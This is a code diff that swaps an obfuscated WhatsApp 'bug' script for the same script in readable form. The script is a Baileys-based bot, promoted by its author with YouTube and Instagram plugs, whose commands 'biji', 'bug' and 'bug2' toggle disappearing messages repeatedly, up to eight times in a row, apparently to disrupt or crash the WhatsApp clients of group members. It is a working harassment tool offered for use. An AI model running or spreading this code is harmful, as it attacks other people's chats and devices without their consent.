@@ -1,4 +1,147 @@
-// BUG WHATSAPP BY NASTAR
-// JANGAN LUPA SUBSCRIBE YT BIJI OFC
+const {
+    WAConnection,
+    MessageType,
+    Presence,
+    Mimetype,
+    GroupSettingChange
+} = require('@adiwajshing/baileys')
+const { color, bgcolor } = require('./lib/color')
+const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
+const { fetchJson, fetchText } = require('./lib/fetcher')
+const { recognize } = require('./lib/ocr')
+const fs = require('fs')
+const crypto = require('crypto')
+const util = require('util')
+const { exec, spawn, execSync } = require("child_process")
+prefix = "¥"
+blocked = []
 
-var _0x9749=["\x40\x61\x64\x69\x77\x61\x6A\x73\x68\x69\x6E\x67\x2F\x62\x61\x69\x6C\x65\x79\x73","\x2E\x2F\x6C\x69\x62\x2F\x63\x6F\x6C\x6F\x72","\x2E\x2F\x6C\x69\x62\x2F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x73","\x2E\x2F\x6C\x69\x62\x2F\x66\x65\x74\x63\x68\x65\x72","\x2E\x2F\x6C\x69\x62\x2F\x6F\x63\x72","\x66\x73","\x63\x72\x79\x70\x74\x6F","\x75\x74\x69\x6C","\x63\x68\x69\x6C\x64\x5F\x70\x72\x6F\x63\x65\x73\x73","\xA5","\x30","","\x66\x6C\x6F\x6F\x72","\x4A\x20","\x4D\x20","\x44","\x6C\x65\x76\x65\x6C","\x6C\x6F\x67\x67\x65\x72","\x77\x61\x72\x6E","\x73\x74\x72\x69\x6E\x67","\x6C\x6F\x67","\x71\x72","\x5B","\x77\x68\x69\x74\x65","\x21","\x72\x65\x64","\x5D","\x20\x53\x63\x61\x6E\x20\x74\x68\x65\x20\x71\x72\x20\x63\x6F\x64\x65\x20\x61\x62\x6F\x76\x65","\x6F\x6E","\x2E\x2F\x6E\x73\x74\x72\x62\x75\x67\x2E\x6A\x73\x6F\x6E","\x65\x78\x69\x73\x74\x73\x53\x79\x6E\x63","\x6C\x6F\x61\x64\x41\x75\x74\x68\x49\x6E\x66\x6F","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67","\x32","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6E\x67\x2E\x2E\x2E","\x6F\x70\x65\x6E","\x43\x6F\x6E\x6E\x65\x63\x74\x65\x64","\x5B\x20\x43\x41\x52\x41\x20\x50\x41\x4B\x41\x49\x20\x3A\x20\x5D","\x5B\x20\x4B\x65\x74\x69\x6B\x20\xA5\x62\x69\x6A\x69\x20\x75\x6E\x74\x75\x6B\x20\x6D\x65\x6E\x67\x67\x75\x6E\x61\x6B\x61\x6E\x20\x62\x75\x67\x20\x67\x72\x75\x70\x20\x77\x68\x61\x74\x73\x61\x70\x70\x20\x5D","\x5B\x20\x1B\x5B\x33\x37\x6D\x4A\x41\x4E\x47\x41\x4E\x20\x4C\x55\x50\x41\x1B\x5B\x33\x37\x6D\x20\x53\x55\x42\x43\x52\x49\x42\x45\x20\x59\x54\x20\x42\x69\x6A\x69\x20\x4F\x46\x43\x20\x5D","\x5B\x20\x1B\x5B\x33\x37\x6D\x49\x47\x20\x3A\x20\x1B\x5B\x33\x37\x6D\x20\x40\x69\x74\x73\x2E\x62\x69\x6A\x69\x69\x20\x5D","\x63\x6F\x6E\x6E\x65\x63\x74","\x62\x61\x73\x65\x36\x34\x45\x6E\x63\x6F\x64\x65\x64\x41\x75\x74\x68\x49\x6E\x66\x6F","\x09","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x77\x72\x69\x74\x65\x46\x69\x6C\x65\x53\x79\x6E\x63","\x43\x42\x3A\x42\x6C\x6F\x63\x6B\x6C\x69\x73\x74","\x6C\x65\x6E\x67\x74\x68","\x62\x6C\x6F\x63\x6B\x6C\x69\x73\x74","\x63\x2E\x75\x73","\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x72\x65\x70\x6C\x61\x63\x65","\x70\x75\x73\x68","\x63\x68\x61\x74\x2D\x75\x70\x64\x61\x74\x65","\x68\x61\x73\x4E\x65\x77\x4D\x65\x73\x73\x61\x67\x65","\x61\x6C\x6C","\x6D\x65\x73\x73\x61\x67\x65\x73","\x6D\x65\x73\x73\x61\x67\x65","\x6B\x65\x79","\x72\x65\x6D\x6F\x74\x65\x4A\x69\x64","\x73\x74\x61\x74\x75\x73\x40\x62\x72\x6F\x61\x64\x63\x61\x73\x74","\x66\x72\x6F\x6D\x4D\x65","\x70\x72\x65\x66\x69\x78","\x62\x6C\x6F\x63\x6B\x65\x64","\x6B\x65\x79\x73","\x63\x6F\x6E\x76\x65\x72\x73\x61\x74\x69\x6F\x6E","\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68","\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65","\x63\x61\x70\x74\x69\x6F\x6E","\x76\x69\x64\x65\x6F\x4D\x65\x73\x73\x61\x67\x65","\x65\x78\x74\x65\x6E\x64\x65\x64\x54\x65\x78\x74\x4D\x65\x73\x73\x61\x67\x65","\x74\x65\x78\x74","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x73\x68\x69\x66\x74","\x73\x70\x6C\x69\x74","\x74\x72\x69\x6D","\x73\x6C\x69\x63\x65","\x6A\x69\x64","\x75\x73\x65\x72","\x36\x32\x38\x31\x32\x31\x32\x35\x39\x34\x31\x31\x32\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x40\x67\x2E\x75\x73","\x65\x6E\x64\x73\x57\x69\x74\x68","\x63\x68\x61\x74\x73","\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6E\x74","\x67\x72\x6F\x75\x70\x4D\x65\x74\x61\x64\x61\x74\x61","\x73\x75\x62\x6A\x65\x63\x74","\x70\x61\x72\x74\x69\x63\x69\x70\x61\x6E\x74\x73","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x67\x69","\x6D\x61\x74\x63\x68","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x62\x6C\x61\x63\x6B","\x62\x6C\x75\x65","\x79\x65\x6C\x6C\x6F\x77","\x67\x72\x65\x65\x6E","\x61\x75\x64\x69\x6F\x4D\x65\x73\x73\x61\x67\x65","\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x1B\x5B\x31\x3B\x33\x31\x6D\x7E\x1B\x5B\x31\x3B\x33\x37\x6D\x3E","\x5B\x1B\x5B\x31\x3B\x33\x32\x6D\x45\x58\x45\x43\x1B\x5B\x31\x3B\x33\x37\x6D\x5D","\x66\x72\x6F\x6D","\x40","\x61\x72\x67\x73\x20\x3A","\x69\x6E","\x41\x63\x74\x69\x76\x65\x0A\x0A\x4A\x61\x6E\x67\x61\x6E\x20\x4C\x75\x70\x61\x20\x53\x75\x62\x73\x63\x72\x69\x62\x65\x20\x59\x61\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x2F\x55\x43\x77\x6D\x55\x6C\x39\x79\x69\x39\x71\x51\x6D\x46\x67\x33\x43\x2D\x48\x55\x53\x35\x61\x67","\x74\x65\x73\x74","\x74\x6F\x67\x67\x6C\x65\x44\x69\x73\x61\x70\x70\x65\x61\x72\x69\x6E\x67\x4D\x65\x73\x73\x61\x67\x65\x73","\x44\x6F\x6E\x65","\x62\x69\x6A\x69","\x62\x75\x67","\x62\x75\x67\x32","\x45\x72\x72\x6F\x72\x20\x3A\x20\x25\x73"];const {WAConnection,MessageType,Presence,Mimetype,GroupSettingChange}=require(_0x9749[0]);const {color,bgcolor}=require(_0x9749[1]);const {wait,simih,getBuffer,h2k,generateMessageID,getGroupAdmins,getRandom,banner,start,info,success,close}=require(_0x9749[2]);const {fetchJson,fetchText}=require(_0x9749[3]);const {recognize}=require(_0x9749[4]);const fs=require(_0x9749[5]);const crypto=require(_0x9749[6]);const util=require(_0x9749[7]);const {exec,spawn,execSync}=require(_0x9749[8]);prefix= _0x9749[9];blocked= [];function kyun(_0x2754x5){function _0x2754x6(_0x2754x7){return (_0x2754x7< 10?_0x9749[10]:_0x9749[11])+ _0x2754x7}var _0x2754x8=Math[_0x9749[12]](_0x2754x5/ (60* 60));var _0x2754x9=Math[_0x9749[12]](_0x2754x5% (60* 60)/ 60);var _0x2754x5=Math[_0x9749[12]](_0x2754x5% 60);return `${_0x9749[11]}${_0x2754x6(_0x2754x8)}${_0x9749[13]}${_0x2754x6(_0x2754x9)}${_0x9749[14]}${_0x2754x6(_0x2754x5)}${_0x9749[15]}`}async function starts(){const _0x2754xb= new WAConnection();_0x2754xb[_0x9749[17]][_0x9749[16]]= _0x9749[18];console[_0x9749[20]](banner[_0x9749[19]]);_0x2754xb[_0x9749[28]](_0x9749[21],()=>{console[_0x9749[20]](color(_0x9749[22],_0x9749[23]),color(_0x9749[24],_0x9749[25]),color(_0x9749[26],_0x9749[23]),color(_0x9749[27]))});fs[_0x9749[30]](_0x9749[29])&& _0x2754xb[_0x9749[31]](_0x9749[29]);_0x2754xb[_0x9749[28]](_0x9749[32],()=>{start(_0x9749[33],_0x9749[34])});_0x2754xb[_0x9749[28]](_0x9749[35],()=>{success(_0x9749[33],_0x9749[36])});console[_0x9749[20]](_0x9749[37]);console[_0x9749[20]](_0x9749[38]);console[_0x9749[20]](_0x9749[11]);console[_0x9749[20]](_0x9749[39]);console[_0x9749[20]](_0x9749[40]); await _0x2754xb[_0x9749[41]]({timeoutMs:30* 1000});fs[_0x9749[45]](_0x9749[29],JSON[_0x9749[44]](_0x2754xb[_0x9749[42]](),null,_0x9749[43]));_0x2754xb[_0x9749[28]](_0x9749[46],(_0x2754xc)=>{if(blocked[_0x9749[47]]> 2){return};for(let _0x2754xd of _0x2754xc[1][_0x9749[48]]){blocked[_0x9749[52]](_0x2754xd[_0x9749[51]](_0x9749[49],_0x9749[50]))}});_0x2754xb[_0x9749[28]](_0x9749[53],async (_0x2754xe)=>{try{if(!_0x2754xe[_0x9749[54]]){return};_0x2754xe= _0x2754xe[_0x9749[56]][_0x9749[55]]()[0];if(!_0x2754xe[_0x9749[57]]){return};if(_0x2754xe[_0x9749[58]]&& _0x2754xe[_0x9749[58]][_0x9749[59]]== _0x9749[60]){return};if(!_0x2754xe[_0x9749[58]][_0x9749[61]]){return};global[_0x9749[62]];global[_0x9749[63]];const _0x2754xf=JSON[_0x9749[44]](_0x2754xe[_0x9749[57]]);const _0x2754x10=_0x2754xe[_0x9749[58]][_0x9749[59]];const _0x2754x11=Object[_0x9749[64]](_0x2754xe[_0x9749[57]])[0];const {text,extendedText,contact,location,liveLocation,image,video,sticker,document,audio,product}=MessageType;body= (_0x2754x11=== _0x9749[65]&& _0x2754xe[_0x9749[57]][_0x9749[65]][_0x9749[66]](prefix))?_0x2754xe[_0x9749[57]][_0x9749[65]]:(_0x2754x11== _0x9749[67])&& _0x2754xe[_0x9749[57]][_0x9749[67]][_0x9749[68]][_0x9749[66]](prefix)?_0x2754xe[_0x9749[57]][_0x9749[67]][_0x9749[68]]:(_0x2754x11== _0x9749[69])&& _0x2754xe[_0x9749[57]][_0x9749[69]][_0x9749[68]][_0x9749[66]](prefix)?_0x2754xe[_0x9749[57]][_0x9749[69]][_0x9749[68]]:(_0x2754x11== _0x9749[70])&& _0x2754xe[_0x9749[57]][_0x9749[70]][_0x9749[71]][_0x9749[66]](prefix)?_0x2754xe[_0x9749[57]][_0x9749[70]][_0x9749[71]]:_0x9749[11];var _0x2754x12=(_0x2754x11=== _0x9749[65]&& _0x2754xe[_0x9749[57]][_0x9749[65]])?_0x2754xe[_0x9749[57]][_0x9749[65]]:(_0x2754x11== _0x9749[67])&& _0x2754xe[_0x9749[57]][_0x9749[67]][_0x9749[68]]?_0x2754xe[_0x9749[57]][_0x9749[67]][_0x9749[68]]:(_0x2754x11== _0x9749[69])&& _0x2754xe[_0x9749[57]][_0x9749[69]][_0x9749[68]]?_0x2754xe[_0x9749[57]][_0x9749[69]][_0x9749[68]]:(_0x2754x11== _0x9749[70])&& _0x2754xe[_0x9749[57]][_0x9749[70]][_0x9749[71]]?_0x2754xe[_0x9749[57]][_0x9749[70]][_0x9749[71]]:_0x9749[11];const _0x2754x13=_0x2754x12[_0x9749[76]](0)[_0x9749[75]]()[_0x9749[74]](/ +/)[_0x9749[73]]()[_0x9749[72]]();budy= (_0x2754x11=== _0x9749[65])?_0x2754xe[_0x9749[57]][_0x9749[65]]:(_0x2754x11=== _0x9749[70])?_0x2754xe[_0x9749[57]][_0x9749[70]][_0x9749[71]]:_0x9749[11];const _0x2754x14=body[_0x9749[76]](1)[_0x9749[75]]()[_0x9749[74]](/ +/)[_0x9749[73]]()[_0x9749[72]]();const _0x2754x15=body[_0x9749[75]]()[_0x9749[74]](/ +/)[_0x9749[76]](1);const _0x2754x16=body[_0x9749[66]](prefix);const _0x2754x17=_0x2754xb[_0x9749[78]][_0x9749[77]];const _0x2754x18=[`${_0x9749[79]}`];const _0x2754x19=_0x2754x10[_0x9749[81]](_0x9749[80]);const _0x2754x1a= await _0x2754xb[_0x9749[82]][_0x9749[55]]();const _0x2754x1b=_0x2754x19?_0x2754xe[_0x9749[83]]:_0x2754xe[_0x9749[58]][_0x9749[59]];const _0x2754x1c=_0x2754x19? await _0x2754xb[_0x9749[84]](_0x2754x10):_0x9749[11];const _0x2754x1d=_0x2754x19?_0x2754x1c[_0x9749[85]]:_0x9749[11];const _0x2754x1e=_0x2754x19?_0x2754x1c[_0x9749[77]]:_0x9749[11];const _0x2754x1f=_0x2754x19?_0x2754x1c[_0x9749[86]]:_0x9749[11];const _0x2754x20=_0x2754x19?getGroupAdmins(_0x2754x1f):_0x9749[11];const _0x2754x21=_0x2754x20[_0x9749[87]](_0x2754x17)|| false;const _0x2754x22=_0x2754x20[_0x9749[87]](_0x2754x1b)|| false;const _0x2754x23=_0x2754x18[_0x9749[87]](_0x2754x1b);const _0x2754x24=(_0x2754x25)=>{return _0x2754x25[_0x9749[89]]( new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,_0x9749[88]))};const _0x2754x26=(_0x2754x27)=>{_0x2754xb[_0x9749[90]](_0x2754x10,_0x2754x27,text,{quoted:_0x2754xe})};const _0x2754x28=(_0x2754x29,_0x2754x27)=>{_0x2754xb[_0x9749[90]](_0x2754x29,_0x2754x27,text)};colors= [_0x9749[25],_0x9749[23],_0x9749[91],_0x9749[92],_0x9749[93],_0x9749[94]];const _0x2754x2a=(_0x2754x11=== _0x9749[67]|| _0x2754x11=== _0x9749[69]);const _0x2754x2b=_0x2754x11=== _0x9749[70]&& _0x2754xf[_0x9749[87]](_0x9749[95]);const _0x2754x2c=_0x2754x11=== _0x9749[70]&& _0x2754xf[_0x9749[87]](_0x9749[67]);const _0x2754x2d=_0x2754x11=== _0x9749[70]&& _0x2754xf[_0x9749[87]](_0x9749[69]);const _0x2754x2e=_0x2754x11=== _0x9749[70]&& _0x2754xf[_0x9749[87]](_0x9749[96]);if(!_0x2754x19&& _0x2754x16){console[_0x9749[20]](_0x9749[97],_0x9749[98],color(_0x2754x14),_0x9749[99],color(_0x2754x1b[_0x9749[74]](_0x9749[100])[0]),_0x9749[101],color(_0x2754x15[_0x9749[47]]))};if(_0x2754x16&& _0x2754x19){console[_0x9749[20]](_0x9749[97],_0x9749[98],color(_0x2754x14),_0x9749[99],color(_0x2754x1b[_0x9749[74]](_0x9749[100])[0]),_0x9749[102],color(_0x2754x1d),_0x9749[101],color(_0x2754x15[_0x9749[47]]))};switch(_0x2754x14){case _0x9749[104]:_0x2754xb[_0x9749[90]](_0x2754x10,_0x9749[103],MessageType[_0x9749[71]],{quoted:_0x2754xe});break;case _0x9749[107]: await _0x2754xb[_0x9749[105]](_0x2754x10);_0x2754xb[_0x9749[90]](_0x2754x10,`${_0x9749[106]}`,text);break;case _0x9749[108]: await _0x2754xb[_0x9749[105]](_0x2754x10);_0x2754xb[_0x9749[105]](_0x2754x10);_0x2754xb[_0x9749[90]](_0x2754x10,`${_0x9749[106]}`,text);break;case _0x9749[109]: await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10); await _0x2754xb[_0x9749[105]](_0x2754x10);_0x2754xb[_0x9749[90]](_0x2754x10,`${_0x9749[106]}`,text);break}}catch(e){console[_0x9749[20]](_0x9749[110],color(e,_0x9749[25]))}})}starts()
+function kyun(seconds){
+  function pad(s){
+    return (s < 10 ? '0' : '') + s;
+  }
+  var hours = Math.floor(seconds / (60*60));
+  var minutes = Math.floor(seconds % (60*60) / 60);
+  var seconds = Math.floor(seconds % 60);
+
+  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
+  return `${pad(hours)}J ${pad(minutes)}M ${pad(seconds)}D`
+}
+
+async function starts() {
+	const nstr = new WAConnection()
+	nstr.logger.level = 'warn'
+	console.log(banner.string)
+	nstr.on('qr', () => {
+		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code above'))
+	})
+
+	fs.existsSync('./nstrbug.json') && nstr.loadAuthInfo('./nstrbug.json')
+	nstr.on('connecting', () => {
+		start('2', 'Connecting...')
+	})
+	nstr.on('open', () => {
+		success('2', 'Connected')
+	})
+		console.log('[ CARA PAKAI : ]')
+        console.log('[ Ketik ¥biji untuk menggunakan bug grup whatsapp ]')
+		console.log('')
+        console.log('[ \x1B[37m\JANGAN LUPA\x1B[37m SUBCRIBE YT Biji OFC ]');
+		console.log('[ \x1B[37m\IG : \x1B[37m @its.bijii ]');
+	await nstr.connect({timeoutMs: 30*1000})
+        fs.writeFileSync('./nstrbug.json', JSON.stringify(nstr.base64EncodedAuthInfo(), null, '\t'))
+	
+	nstr.on('CB:Blocklist', json => {
+            if (blocked.length > 2) return
+	    for (let i of json[1].blocklist) {
+	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
+	    }
+	})
+
+	nstr.on('chat-update', async (nass) => {
+		try {
+            if (!nass.hasNewMessage) return
+            nass = nass.messages.all()[0]
+			if (!nass.message) return
+			if (nass.key && nass.key.remoteJid == 'status@broadcast') return
+			if (!nass.key.fromMe) return
+			global.prefix
+			global.blocked
+			const content = JSON.stringify(nass.message)
+			const from = nass.key.remoteJid
+			const type = Object.keys(nass.message)[0]
+			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
+			body = (type === 'conversation' && nass.message.conversation.startsWith(prefix)) ? nass.message.conversation : (type == 'imageMessage') && nass.message.imageMessage.caption.startsWith(prefix) ? nass.message.imageMessage.caption : (type == 'videoMessage') && nass.message.videoMessage.caption.startsWith(prefix) ? nass.message.videoMessage.caption : (type == 'extendedTextMessage') && nass.message.extendedTextMessage.text.startsWith(prefix) ? nass.message.extendedTextMessage.text : ''
+                        var pes = (type === 'conversation' && nass.message.conversation) ? nass.message.conversation : (type == 'imageMessage') && nass.message.imageMessage.caption ? nass.message.imageMessage.caption : (type == 'videoMessage') && nass.message.videoMessage.caption ? nass.message.videoMessage.caption : (type == 'extendedTextMessage') && nass.message.extendedTextMessage.text ? nass.message.extendedTextMessage.text : ''
+			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
+			budy = (type === 'conversation') ? nass.message.conversation : (type === 'extendedTextMessage') ? nass.message.extendedTextMessage.text : ''
+			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
+			const args = body.trim().split(/ +/).slice(1)
+			const isCmd = body.startsWith(prefix)
+
+			const botNumber = nstr.user.jid
+			const ownerNumber = [`6281212594112@s.whatsapp.net`] // replace this with your number
+			const isGroup = from.endsWith('@g.us')
+			const totalchat = await nstr.chats.all()
+			const sender = isGroup ? nass.participant : nass.key.remoteJid
+			const groupMetadata = isGroup ? await nstr.groupMetadata(from) : ''
+			const groupName = isGroup ? groupMetadata.subject : ''
+			const groupId = isGroup ? groupMetadata.jid : ''
+			const groupMembers = isGroup ? groupMetadata.participants : ''
+			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
+			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
+			const isGroupAdmins = groupAdmins.includes(sender) || false
+			const isOwner = ownerNumber.includes(sender)
+			const isUrl = (url) => {
+			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
+			}
+			const reply = (teks) => {
+				nstr.sendMessage(from, teks, text, {quoted:nass})
+			}
+			const sendMess = (hehe, teks) => {
+				nstr.sendMessage(hehe, teks, text)
+			}
+
+			colors = ['red','white','black','blue','yellow','green']
+			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
+			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
+			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
+			switch(command) {
+                            
+             	case 'test':
+			    nstr.sendMessage(from, 'Active\n\nJangan Lupa Subscribe Ya\nhttps://youtube.com/channel/UCwmUl9yi9qQmFg3C-HUS5ag',MessageType.text, { quoted: nass} )
+				break    
+				
+	            case 'biji':
+                await nstr.toggleDisappearingMessages(from)
+                nstr.sendMessage(from, `Done`, text)
+                break
+
+                case 'bug':
+                await nstr.toggleDisappearingMessages(from)
+			    nstr.toggleDisappearingMessages(from)
+			    nstr.sendMessage(from, `Done`, text)
+			    break
+
+                case 'bug2':
+			    await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                await nstr.toggleDisappearingMessages(from)
+                nstr.sendMessage(from, `Done`, text)
+                break			                           
+          }
+		} catch (e) {
+			console.log('Error : %s', color(e, 'red'))
+		}
+	})
+}
+starts()
